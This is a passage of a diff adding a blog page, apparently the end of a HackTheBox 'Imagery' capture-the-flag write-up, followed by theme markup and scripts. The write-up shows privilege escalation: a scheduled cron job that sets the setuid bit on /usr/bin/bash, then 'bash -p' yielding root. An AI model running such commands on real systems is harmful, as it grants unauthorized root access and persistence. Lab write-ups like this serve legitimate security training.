class="hljs-keyword">to</span> confirm: <br><br>[2025-11-20 01:30:52] [<span class="hljs-built_in">INFO</span>]<span class="hljs-built_in"> System </span>password verified successfully.<br>[2025-11-20 01:30:52] [<span class="hljs-built_in">INFO</span>] Auto job <span class="hljs-string">&#x27;suid_bash&#x27;</span> (ID: e31900bc-bbcb-4c8b-aa6e-cc6738c22f22) added successfully. The job will <span class="hljs-built_in">run</span> according <span class="hljs-keyword">to</span> schedule.<br>[2025-11-20 01:30:52] [<span class="hljs-built_in">INFO</span>] Cron line added: * * * * * <span class="hljs-attribute">CHARCOL_NON_INTERACTIVE</span>=<span class="hljs-literal">true</span> chmod u+s /usr/bin/bash<br>charcol&gt; exit<br>[2025-11-20 01:31:00] [<span class="hljs-built_in">INFO</span>] Exiting Charcol shell.<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mark@Imagery:~$ /usr/bin/bash -p<br>bash-5.2# id<br><span class="hljs-attribute">uid</span>=1002(mark) <span class="hljs-attribute">gid</span>=1002(mark) <span class="hljs-attribute">euid</span>=0(root) <span class="hljs-attribute">groups</span>=1002(mark)<br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HTB/" class="print-no-link">#HTB</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Imagery</div>
+      <div>http://example.com/2025/11/20/HackTheBox-Imagery/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 20, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/18/HackTheBox-Giveback/" title="HackTheBox-Giveback">
+                        <span class="hidden-mobile">HackTheBox-Giveback</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
